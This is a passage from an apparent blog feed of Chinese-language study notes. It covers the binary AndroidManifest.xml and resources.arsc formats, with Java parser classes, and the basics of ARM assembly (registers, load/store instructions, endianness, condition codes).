&lt;li&gt;&lt;p&gt;Unknown：未知区域,4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Prefix：命名空间的前缀（在字符串中的索引值），eg:&lt;code&gt;android&lt;/code&gt;。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Uri：命名空间的URI（在字符串中的索引值），eg:&lt;code&gt;http://schemas.android.com/apk/res/android&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;Start Tag Chunk&lt;/strong&gt;：AndroidMaifest.xml的标签信息，最核心的内容，也是最复杂的内容。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Chunk Type：类型，固定4bytes。（0x00100102)。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Chunk Size：大小，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Line Number ：对应AndroidMaifest中的行号，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Unknown：未知区域,4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Namespace Uri ：命名空间的Uri，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Name：标签名称（在字符串中的索引值），4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Flags：标签的类型，4bytes。eg：是开始标签还是结束标签？&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Attributes Counk：便签中包含的属性的个数，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Class Attribute：标签包含的类属性，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Attributes ：属性内容，每个属性算是一个Entry，Entry是一个大小5的字节数组[Namespace,URI,Name,ValueString,Data]，大小为”属性个数* 5 *4&amp;rdquo;个字节。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&#34;axmlprinter工具&#34;&gt;AXMLPrinter工具&lt;/h5&gt;

&lt;h5 id=&#34;aapt-工具&#34;&gt;aapt 工具&lt;/h5&gt;

&lt;h3 id=&#34;第六章-resourec-arsc文件格式解析&#34;&gt;第六章 resourec.arsc文件格式解析&lt;/h3&gt;

&lt;h5 id=&#34;资源文件id格式&#34;&gt;资源文件id格式&lt;/h5&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829200453.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829200408.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;center&gt; resourec.arsc文件格式&lt;/center&gt;&lt;/p&gt;

&lt;h5 id=&#34;数据结构&#34;&gt;数据结构&lt;/h5&gt;

&lt;p&gt;上图&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;头部信息&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;resourec.arsc文件格式由一系列chunk组成，每一个chunk均包含一个ResChunk_header&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResChunkHeader{
      public short type;  //当前chunk的类型
      public short headerSize; //当前chunk的头部大小
      public int size;  //当前chunk的大小
      
      public int getHeaderSize(){
        return 2+2+4    
      }
      @Override
      public String toString(){
          return &amp;quot;type:&amp;quot;+Utils.bytesToHexString(
          Utils.int2Byte(type))+&amp;quot;,headerSize:&amp;quot;+headerSize+&amp;quot;,size:&amp;quot;+size;
      }
  }
  
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;资源索引表的头部信息&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;resourec.arsc的第一个结构，结构描述了Resource.arsc文件的大小和资源包数量：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public class ResTableHeader {
    
    public ResChunkHeader header;  //就是标准的Chunk头部信息格式
    public int packageCount;  //被编译的资源包的个数
    
    public ResTableHeader(){
        header = new ResChunkHeader();
    }
    
    public int getHeaderSize(){
        return header.getHeaderSize() + 4;
    }
    
    @Override
    public String toString(){
        return &amp;quot;header:&amp;quot;+header.toString()+&amp;quot;\n&amp;quot; + &amp;quot;packageCount:&amp;quot;+packageCount;
    }
    
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829204728.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;资源项的值字符串资源池&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;包含了所有在资源包里面定义的资源项的值字符串，结构如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResStringPoolHeader {
    
    public ResChunkHeader header;  //标准的Chunk头部信息结构
    public int stringCount;  //字符串的个数
    public int styleCount;  //字符串样式的个数
    
    public final static int SORTED_FLAG = 1;
    public final static int UTF8_FLAG = (1&amp;lt;&amp;lt;8);
    
    public int flags;  //字符串的属性,可取值包括0x000(UTF-16),0x001(字符串经过排序)、0X100(UTF-8)和他们的组合值
    public int stringsStart;  //字符串内容块相对于其头部的距离
    public int stylesStart;  //字符串样式块相对于其头部的距离
    
    public ResStringPoolHeader(){
        header = new ResChunkHeader();
    }
    
    public int getHeaderSize(){
        return header.getHeaderSize() + 4 + 4 + 4 + 4 + 4;
    }
    
    @Override
    public String toString(){
        return &amp;quot;header:&amp;quot;+header.toString()+&amp;quot;\n&amp;quot; + &amp;quot;stringCount:&amp;quot;+stringCount+&amp;quot;,styleCount:&amp;quot;+styleCount+&amp;quot;,flags:&amp;quot;+flags+&amp;quot;,stringStart:&amp;quot;+stringsStart+&amp;quot;,stylesStart:&amp;quot;+stylesStart;
    }
    
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接着头部的的是两个偏移数组，分别是字符串偏移数组和字符串样式偏移数组。这两个偏移数组的大小分别等于stringCount和styleCount的值，而每一个元素的类型都是无符号整型。整个字符中资源池结构如下。&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829205108.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;字符串资源池中的字符串前两个字节为字符串长度,长度计算方法如下：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;len = (((hbyte &amp;amp; 0x7F) &amp;lt;&amp;lt; 8)) | lbyte;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;如果字符串编码格式为UTF-8则字符串以0X00作为结束符,UTF-16则以0X0000作为结束符。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Package数据块&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个数据块记录编译包的元数据，头部信息如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResTablePackage {
    
    public ResChunkHeader header;  //Chunk的头部信息数据结构
    public int id;  //包的ID,等于Package Id,一般用户包的值Package Id为0X7F,系统资源包的Package Id为0X01；
    public char[] name = new char[128]; //包名
    public int typeStrings;  //类型字符串资源池相对头部的偏移
    public int lastPublicType;  //最后一个导出的Public类型字符串在类型字符串资源池中的索引，目前这个值设置为类型字符串资源池的元素个数。在解析的过程中没发现他的用途
    public int keyStrings;  //资源项名称字符串相对头部的偏移
    public int lastPublicKey; // 最后一个导出的Public资源项名称字符串在资源项名称字符串资源池中的索引，目前这个值设置为资源项名称字符串资源池的元素个数。在解析的过程中没发现他的用途
    
    public ResTablePackage(){
        header = new ResChunkHeader();
    }
    
    @Override
    public String toString(){
        return &amp;quot;header:&amp;quot;+header.toString()+&amp;quot;\n&amp;quot;+&amp;quot;,id=&amp;quot;+id+&amp;quot;,name:&amp;quot;+name.toString()+&amp;quot;,typeStrings:&amp;quot;+typeStrings+&amp;quot;,lastPublicType:&amp;quot;+lastPublicType+&amp;quot;,keyStrings:&amp;quot;+keyStrings+&amp;quot;,lastPublicKey:&amp;quot;+lastPublicKey;
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829205652.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;类型规范数据块&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;用来描述资源项的配置差异性。每一种类型都对应有一个类型规范数据块。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  
  public class ResTableTypeSpec {
    
    public final static int SPEC_PUBLIC = 0x40000000;
    
    public ResChunkHeader header;  //Chunk的头部信息结构
    public byte id;  //标识资源的Type ID,Type ID是指资源的类型ID。资源的类型有animator、anim、color、drawable、layout、menu、raw、string和xml等等若干种，每一种都会被赋予一个ID。
    public byte res0;  //保留,始终为0
    public short res1;  //保留,始终为0
    public int entryCount;  //等于本类型的资源项个数,指名称相同的资源项的个数。
    
    public ResTableTypeSpec(){
        header = new ResChunkHeader();
    }
    
    @Override
    public String toString(){
        return &amp;quot;header:&amp;quot;+header.toString()+&amp;quot;,id:&amp;quot;+id+&amp;quot;,res0:&amp;quot;+res0+&amp;quot;,res1:&amp;quot;+res1+&amp;quot;,entryCount:&amp;quot;+entryCount;
    }
    
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;资源类型项数据块&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;描述资源项的具体信息，名称、值、配置等信息&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResTableType {
    
    public ResChunkHeader header;  //Chunk的头部信息结构
    
    public final static int NO_ENTRY = 0xFFFFFFFF;
    
    public byte id;  //标识资源的Type ID
    public byte res0;  //保留,始终为0
    public short res1;  //保留,始终为0
    public int entryCount;  //等于本类型的资源项个数,指名称相同的资源项的个数。
    public int entriesStart;  //等于资源项数据块相对头部的偏移值。
    
    public ResTableConfig resConfig;  //指向一个ResTable_config,用来描述配置信息,地区,语言,分辨率等
    
    public ResTableType(){
        header = new ResChunkHeader();
        resConfig = new ResTableConfig();
    }
   
    public int getSize(){
        return header.getHeaderSize() + 1 + 1 + 2 + 4 + 4;
    }
    
    @Override
    public String toString(){
        return &amp;quot;header:&amp;quot;+header.toString()+&amp;quot;,id:&amp;quot;+id+&amp;quot;,res0:&amp;quot;+res0+&amp;quot;,res1:&amp;quot;+res1+&amp;quot;,entryCount:&amp;quot;+entryCount+&amp;quot;,entriesStart:&amp;quot;+entriesStart;
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ResTable_type后接着是一个大小为entryCount的uint32_t数组，每一个数组元素都用来描述一个资源项数据块的偏移位置。 紧跟在这个偏移数组后面的是一个大小为entryCount的ResTable_entry数组,每一个数组元素都用来描述一个资源项的具体信息。ResTable_entry的结构如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResTableEntry {
    
    public final static int FLAG_COMPLEX = 0x0001;
    public final static int FLAG_PUBLIC = 0x0002;
    
    public short size;
    public short flags;
    
    public ResStringPoolRef key;
    
    public ResTableEntry(){
        key = new ResStringPoolRef();
    }
    
    public int getSize(){
        return 2+2+key.getSize();
    }
    
    @Override
    public String toString(){
        return &amp;quot;size:&amp;quot;+size+&amp;quot;,flags:&amp;quot;+flags+&amp;quot;,key:&amp;quot;+key.toString()+&amp;quot;,str:&amp;quot;+ParseResourceUtils.getKeyString(key.index);
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ResTable_entry根据flags的不同,后面跟随的数据也不相同,如果flags此位为1,则ResTable_entry是ResTable_map_entry,ResTable_map_entry继承自ResTable_entry,其结构如下。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResTableMapEntry extends ResTableEntry{
    
    public ResTableRef parent;
    public int count;
    
    public ResTableMapEntry(){
        parent = new ResTableRef();
    }
    
    @Override
    public int getSize(){
        return super.getSize() + parent.getSize() + 4;
    }
    
    @Override
    public String toString(){
        return super.toString() + &amp;quot;,parent:&amp;quot;+parent.toString()+&amp;quot;,count:&amp;quot;+count;
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ResTable_map_entry其后跟随则count个ResTable_map类型的数组,ResTable_map的结构如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  package com.wjdiankong.parseresource.type;
   
  /**
   struct ResTable_map
   {
       //bag资源项ID
       ResTable_ref name;
       //bag资源项值
       Res_value value;
   };
   * @author i
   *
   */
  public class ResTableMap {
    
    public ResTableRef name;
    public ResValue value;
    
    public ResTableMap(){
        name = new ResTableRef();
        value = new ResValue();
    }
    
    public int getSize(){
        return name.getSize() + value.getSize();
    }
    
    @Override
    public String toString(){
        return name.toString()+&amp;quot;,value:&amp;quot;+value.toString();
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果flags此位为0,则ResTable_entry其后跟随的是一个Res_value,描述一个普通资源的值,Res_value结构如下。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResValue {
    
    //dataType字段使用的常量
    public final static int TYPE_NULL = 0x00;
    public final static int TYPE_REFERENCE = 0x01;
    public final static int TYPE_ATTRIBUTE = 0x02;
    public final static int TYPE_STRING = 0x03;
    public final static int TYPE_FLOAT = 0x04;
    public final static int TYPE_DIMENSION = 0x05;
    public final static int TYPE_FRACTION = 0x06;
    public final static int TYPE_FIRST_INT = 0x10;
    public final static int TYPE_INT_DEC = 0x10;
    public final static int TYPE_INT_HEX = 0x11;
    public final static int TYPE_INT_BOOLEAN = 0x12;
    public final static int TYPE_FIRST_COLOR_INT = 0x1c;
    public final static int TYPE_INT_COLOR_ARGB8 = 0x1c;
    public final static int TYPE_INT_COLOR_RGB8 = 0x1d;
    public final static int TYPE_INT_COLOR_ARGB4 = 0x1e;
    public final static int TYPE_INT_COLOR_RGB4 = 0x1f;
    public final static int TYPE_LAST_COLOR_INT = 0x1f;
    public final static int TYPE_LAST_INT = 0x1f;
    
    public static final int
      COMPLEX_UNIT_PX           =0,
      COMPLEX_UNIT_DIP      =1,
      COMPLEX_UNIT_SP           =2,
      COMPLEX_UNIT_PT           =3,
      COMPLEX_UNIT_IN           =4,
      COMPLEX_UNIT_MM           =5,
    COMPLEX_UNIT_SHIFT      =0,
      COMPLEX_UNIT_MASK     =15,
      COMPLEX_UNIT_FRACTION =0,
      COMPLEX_UNIT_FRACTION_PARENT=1,
      COMPLEX_RADIX_23p0        =0,
      COMPLEX_RADIX_16p7        =1,
      COMPLEX_RADIX_8p15        =2,
      COMPLEX_RADIX_0p23        =3,
      COMPLEX_RADIX_SHIFT       =4,
      COMPLEX_RADIX_MASK        =3,
      COMPLEX_MANTISSA_SHIFT    =8,
      COMPLEX_MANTISSA_MASK =0xFFFFFF;
    
    
    public short size;  //ResValue的头部大小
    public byte res0;  //保留，始终为0
    public byte dataType;  //数据的类型,可以从上面的枚举类型中获取
    public int data;  //数据对应的索引
    
    public int getSize(){
        return 2 + 1 + 1 + 4;
    }
    
    public String getTypeStr(){
        switch(dataType){
            case TYPE_NULL:
                return &amp;quot;TYPE_NULL&amp;quot;;
            case TYPE_REFERENCE:
                return &amp;quot;TYPE_REFERENCE&amp;quot;;
            case TYPE_ATTRIBUTE:
                return &amp;quot;TYPE_ATTRIBUTE&amp;quot;;
            case TYPE_STRING:
                return &amp;quot;TYPE_STRING&amp;quot;;
            case TYPE_FLOAT:
                return &amp;quot;TYPE_FLOAT&amp;quot;;
            case TYPE_DIMENSION:
                return &amp;quot;TYPE_DIMENSION&amp;quot;;
            case TYPE_FRACTION:
                return &amp;quot;TYPE_FRACTION&amp;quot;;
            case TYPE_FIRST_INT:
                return &amp;quot;TYPE_FIRST_INT&amp;quot;;
            case TYPE_INT_HEX:
                return &amp;quot;TYPE_INT_HEX&amp;quot;;
            case TYPE_INT_BOOLEAN:
                return &amp;quot;TYPE_INT_BOOLEAN&amp;quot;;
            case TYPE_FIRST_COLOR_INT:
                return &amp;quot;TYPE_FIRST_COLOR_INT&amp;quot;;
            case TYPE_INT_COLOR_RGB8:
                return &amp;quot;TYPE_INT_COLOR_RGB8&amp;quot;;
            case TYPE_INT_COLOR_ARGB4:
                return &amp;quot;TYPE_INT_COLOR_ARGB4&amp;quot;;
            case TYPE_INT_COLOR_RGB4:
                return &amp;quot;TYPE_INT_COLOR_RGB4&amp;quot;;
        }
        return &amp;quot;&amp;quot;;
    }
    
    /*public String getDataStr(){
        if(dataType == TYPE_STRING){
            return ParseResourceUtils.getResString(data);
        }else if(dataType == TYPE_FIRST_COLOR_INT){
            return Utils.bytesToHexString(Utils.int2Byte(data));
        }else if(dataType == TYPE_INT_BOOLEAN){
            return data==0 ? &amp;quot;false&amp;quot; : &amp;quot;true&amp;quot;;
        }
        return data+&amp;quot;&amp;quot;;
    }*/
    
    public String getDataStr() {
        if (dataType == TYPE_STRING) {
            return ParseResourceUtils.getResString(data);
        }
        if (dataType == TYPE_ATTRIBUTE) {
            return String.format(&amp;quot;?%s%08X&amp;quot;,getPackage(data),data);
        }
        if (dataType == TYPE_REFERENCE) {
            return String.format(&amp;quot;@%s%08X&amp;quot;,getPackage(data),data);
        }
        if (dataType == TYPE_FLOAT) {
            return String.valueOf(Float.intBitsToFloat(data));
        }
        if (dataType == TYPE_INT_HEX) {
            return String.format(&amp;quot;0x%08X&amp;quot;,data);
        }
        if (dataType == TYPE_INT_BOOLEAN) {
            return data!=0?&amp;quot;true&amp;quot;:&amp;quot;false&amp;quot;;
        }
        if (dataType == TYPE_DIMENSION) {
            return Float.toString(complexToFloat(data))+
                DIMENSION_UNITS[data &amp;amp; COMPLEX_UNIT_MASK];
        }
        if (dataType == TYPE_FRACTION) {
            return Float.toString(complexToFloat(data))+
                FRACTION_UNITS[data &amp;amp; COMPLEX_UNIT_MASK];
        }
        if (dataType &amp;gt;= TYPE_FIRST_COLOR_INT &amp;amp;&amp;amp; dataType &amp;lt;= TYPE_LAST_COLOR_INT) {
            return String.format(&amp;quot;#%08X&amp;quot;,data);
        }
        if (dataType &amp;gt;= TYPE_FIRST_INT &amp;amp;&amp;amp; dataType &amp;lt;= TYPE_LAST_INT) {
            return String.valueOf(data);
        }
        return String.format(&amp;quot;&amp;lt;0x%X, type 0x%02X&amp;gt;&amp;quot;,data, dataType);
    }
    
    private static String getPackage(int id) {
        if (id&amp;gt;&amp;gt;&amp;gt;24==1) {
            return &amp;quot;android:&amp;quot;;
        }
        return &amp;quot;&amp;quot;;
    }
    
    public static float complexToFloat(int complex) {
        return (float)(complex &amp;amp; 0xFFFFFF00)*RADIX_MULTS[(complex&amp;gt;&amp;gt;4) &amp;amp; 3];
    }
    
    private static final float RADIX_MULTS[]={
        0.00390625F,3.051758E-005F,1.192093E-007F,4.656613E-010F
    };
    
    private static final String DIMENSION_UNITS[]={
        &amp;quot;px&amp;quot;,&amp;quot;dip&amp;quot;,&amp;quot;sp&amp;quot;,&amp;quot;pt&amp;quot;,&amp;quot;in&amp;quot;,&amp;quot;mm&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;
    };
    
    private static final String FRACTION_UNITS[]={
        &amp;quot;%&amp;quot;,&amp;quot;%p&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;
    };
    
    @Override
    public String toString(){
        return &amp;quot;size:&amp;quot;+size+&amp;quot;,res0:&amp;quot;+res0+&amp;quot;,dataType:&amp;quot;+getTypeStr()+&amp;quot;,data:&amp;quot;+getDataStr();
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;以上代码来自于书的原作者的博客：&lt;a href=&#34;https://blog.csdn.net/jiangwei0910410003/article/details/50628894&#34;&gt;https://blog.csdn.net/jiangwei0910410003/article/details/50628894&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;博客里还有如何解析操作，留看。&lt;/p&gt;

&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;

&lt;p&gt;这两章讲的还是挺详细的，可以留着备用查阅，这两个文件都能加以混淆来保护应用，所以还是挺重要的。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>ARM汇编基础</title>
      <link>https://naivete.cc/post/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Fri, 10 Aug 2018 19:34:10 +0800</pubDate>
      
      <guid>https://naivete.cc/post/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</guid>
      
        <description>

&lt;h2 id=&#34;arm汇编基础-简&#34;&gt;ARM汇编基础(简)&lt;/h2&gt;

&lt;p&gt;经常忘记，做个笔记，好作复习。。&lt;/p&gt;

&lt;p&gt;内容主要来源于《Android软件安全与逆向分析》和《逆向工程权威指南》以及 &lt;a href=&#34;https://www.anquanke.com/post/id/86383&#34;&gt;ARM 汇编&lt;/a&gt; 和&lt;a href=&#34;https://azeria-labs.com/writing-arm-assembly-part-1/&#34;&gt;Azeria-labs&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;arm架构&#34;&gt;ARM架构&lt;/h3&gt;

&lt;p&gt;ARM属于RISC CPU，&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ARM模式   4个字节opcode  32位&lt;/li&gt;
&lt;li&gt;Thumb模式  2个字节opcode  16位&lt;/li&gt;
&lt;li&gt;Thumb-2模式  同上（只是有部分4个字节的opcode)&lt;/li&gt;
&lt;li&gt;64位ARM  4个字节opcode&lt;/li&gt;
&lt;li&gt;ARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810112415.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;数据类型&#34;&gt;数据类型&lt;/h3&gt;

&lt;p&gt;数据类型在汇编语言中的扩展后缀为&lt;strong&gt;-h&lt;/strong&gt;或者&lt;strong&gt;-sh&lt;/strong&gt;对应着半字，&lt;strong&gt;-b&lt;/strong&gt;或者&lt;strong&gt;-sb&lt;/strong&gt;对应着字节，但是对于字并没有对应的扩展&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810113108.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;ldr = 加载字，宽度四字节
ldrh = 加载无符号的半字，宽度两字节
ldrsh = 加载有符号的半字，宽度两字节
ldrb = 加载无符号的字节
ldrsb = 加载有符号的字节
str = 存储字，宽度四字节
strh = 存储无符号的半字，宽度两字节
strsh = 存储有符号的半字，宽度两字节
strb = 存储无符号的字节
strsb = 存储有符号的字节
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;字节序&#34;&gt;字节序&lt;/h3&gt;

&lt;p&gt;在内存中有两种字节排布顺序，大端序(BE)或者小端序(LE)。两者的主要不同是对象中的每个字节在内存中的存储顺序存在差异。一般X86中是小端序，最低的字节存储在最低的地址上。在大端机中最高的字节存储在最低的地址上。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://p0.ssl.qhimg.com/t01b6d7f41b02b0a58d.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;数据访问时采取大端序还是小端序使用程序状态寄存器(CPSR)的第9比特位来决定的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810120701.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;寄存器&#34;&gt;寄存器&lt;/h3&gt;

&lt;p&gt;37个32位寄存器，其中31个为基础寄存器，6个为状态寄存器。&lt;/p&gt;

&lt;p&gt;用户模式下有&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;不分组寄存器（R0-R7） R7一般存放系统调用号&lt;/li&gt;
&lt;li&gt;分组寄存器（R8-R14）&lt;/li&gt;
&lt;li&gt;程序计数器（R15）&lt;/li&gt;
&lt;li&gt;单前程序状态寄存器（CPSR）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;两种状态：&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;ARM状态（32位对齐）&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Thumb状态(16位对齐)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R0-R7&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;R0-R7(相同)&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;CPSR&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;CPSR（同）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R11&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;FP（栈帧指针）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R12&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;IP（内部程序调用）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R13&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;SP（栈指针）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R14&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;LR（链接寄存器）一般存放函数返回地址&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R15&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;PC（程序计数器）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;和x86对比：&lt;img src=&#34;https://p5.ssl.qhimg.com/t01a8e5d24fa91f9f0f.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;CSPR:&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810122226.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;32位的CPSR寄存器的比特位含义，左边是最大比特位，右边是最小比特位。每个单元代表一个比特。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810122258.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;条件码&lt;/th&gt;
&lt;th&gt;助记符后缀&lt;/th&gt;
&lt;th&gt;标志&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0000&lt;/td&gt;
&lt;td&gt;EQ&lt;/td&gt;
&lt;td&gt;Z置位&lt;/td&gt;
&lt;td&gt;相等&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0001&lt;/td&gt;
&lt;td&gt;NE&lt;/td&gt;
&lt;td&gt;Z清零&lt;/td&gt;
&lt;td&gt;不相等&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0010&lt;/td&gt;
&lt;td&gt;CS&lt;/td&gt;
&lt;td&gt;C置位&lt;/td&gt;
&lt;td&gt;无符号数大于或等于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0011&lt;/td&gt;
&lt;td&gt;CC&lt;/td&gt;
&lt;td&gt;C清零&lt;/td&gt;
&lt;td&gt;无符号数小于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0100&lt;/td&gt;
&lt;td&gt;MI&lt;/td&gt;
&lt;td&gt;N置位&lt;/td&gt;
&lt;td&gt;负数&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0101&lt;/td&gt;
&lt;td&gt;PL&lt;/td&gt;
&lt;td&gt;N清零&lt;/td&gt;
&lt;td&gt;正数或零&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0110&lt;/td&gt;
&lt;td&gt;VS&lt;/td&gt;
&lt;td&gt;V置位&lt;/td&gt;
&lt;td&gt;溢出&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0111&lt;/td&gt;
&lt;td&gt;VC&lt;/td&gt;
&lt;td&gt;V清零&lt;/td&gt;
&lt;td&gt;未溢出&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;HI&lt;/td&gt;
&lt;td&gt;C置位Z清零&lt;/td&gt;
&lt;td&gt;无符号数大于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1001&lt;/td&gt;
